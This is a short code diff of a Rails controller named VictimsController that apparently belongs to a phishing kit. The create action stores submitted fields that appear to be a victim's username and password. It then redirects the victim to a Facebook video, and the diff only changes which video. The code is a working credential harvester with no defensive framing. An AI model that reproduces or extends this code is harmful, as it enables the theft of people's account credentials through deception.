@@ -19,6 +19,6 @@ class VictimsController < ApplicationController
 
 	def create
 		@V=Victim.create(usu: params[:victim][:usu],con: params[:victim][:con],swusu: params[:victim][:swusu])
-		redirect_to 'https://www.facebook.com/galatziaoficial/videos/992663864137637/?theater'
+		redirect_to 'https://www.facebook.com/albertosardinas/videos/10153712228923011/'
 	end
 end
